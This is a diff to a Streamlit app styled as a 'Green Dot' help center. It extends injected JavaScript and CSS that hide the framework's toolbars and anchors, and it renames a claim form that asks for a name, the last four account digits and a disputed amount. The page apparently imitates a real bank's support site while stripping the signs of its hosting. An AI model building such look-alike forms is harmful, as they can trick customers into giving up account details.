@@ -23,7 +23,7 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# JS NUCLEAR V1.2.2 (INTERVALO ULTRA RÁPIDO)
+# JS NUCLEAR V1.2.3 (ELIMINACIÓN DE ANCLAS)
 st.markdown("""<script>
     const nuclearClean = () => {
         const selectors = [
@@ -32,7 +32,7 @@ st.markdown("""<script>
             '.stElementToolbar', '[data-testid="stElementToolbar"]', 
             '.st-emotion-cache-140j12g', '.st-emotion-cache-gi0tri', 
             'button[title="View fullscreen"]', 'button[aria-label="Fullscreen"]',
-            '.section-anchor', 'a.section-anchor'
+            '.section-anchor', 'a.section-anchor', 'svg.etxdrby1'
         ];
         selectors.forEach(s => {
             document.querySelectorAll(s).forEach(el => {
@@ -54,12 +54,12 @@ st.markdown("""<style>
 
     * { color: #FFFFFF !important; }
 
-    /* OCULTAR ELEMENT TOOLBAR ESPECÍFICO */
-    [data-testid="stElementToolbar"], .st-emotion-cache-140j12g, .ewrlt5x20 {
+    /* OCULTAR ANCLAS Y ACTION ELEMENTS */
+    [data-testid="stHeaderActionElements"], .section-anchor, .st-emotion-cache-gi0tri, .etxdrby3 {
         display: none !important;
         visibility: hidden !important;
-        height: 0 !important;
-        width: 0 !important;
+        opacity: 0 !important;
+        pointer-events: none !important;
     }
 
     @media (prefers-color-scheme: light) {
@@ -89,7 +89,7 @@ if not st.session_state.admin_mode:
     if os.path.exists("logo.svg"): st.image("logo.svg", width=250)
     st.title("Help Center")
 
-    with st.form("claim_v1_2_2", clear_on_submit=True):
+    with st.form("claim_v1_2_3", clear_on_submit=True):
         st.text_input("Full Name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", format="%.2f")
